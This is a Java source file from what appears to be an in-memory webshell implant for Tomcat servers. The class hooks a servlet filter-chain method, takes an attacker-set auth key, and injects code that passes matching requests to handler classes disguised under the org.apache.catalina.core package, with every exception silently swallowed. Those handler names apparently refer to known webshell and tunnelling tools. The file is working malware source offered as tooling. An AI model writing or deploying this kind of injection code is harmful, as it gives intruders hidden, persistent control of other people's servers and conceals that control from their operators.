package indi.augusttheodor.stage;

import indi.augusttheodor.Options;

import java.util.HashMap;
import java.util.Map;

public abstract class ServletFilterChainStage implements Stage {

    protected abstract String getClassName();

    protected abstract String getMethodName();

    @Override
    public Map<String, String[]> getHookPoints() {
        Map<String, String[]> re = new HashMap<>();
        re.put(getClassName(), new String[]{getMethodName()});
        return re;
    }

    @Override
    public void configure(Options options) {
        if (options.hasOption("a")) {
            String[] authKey = options.getOptionValue("a").split(":");
            ServletCompat.AUTH_KEY = authKey[0];
            ServletCompat.AUTH_VALUE = authKey[1];
        }
    }

    @Override
    public String getInjectedSource(String className, String methodName, Options options) {
        return "{" +
                "try{" +
                "java.util.Map _ag=indi.augusttheodor.stage.ServletCompat.handle($1,$2);" +
                "if(_ag!=null){" +
                "java.util.Map _rd=indi.augusttheodor.stage.ServletCompat.getRdd(_ag);" +
                "try{org.apache.catalina.core.RebeyondServices.doServices(_rd,_ag);}catch(Throwable _e){}" +
                "try{org.apache.catalina.core.ExtendServices.doServices(_rd,_ag);}catch(Throwable _e){}" +
                "try{org.apache.catalina.core.NeoServices.doServices(_rd,_ag);}catch(Throwable _e){}" +
                "}" +
                "}catch(Throwable _t){}" +
                "}";
    }
}
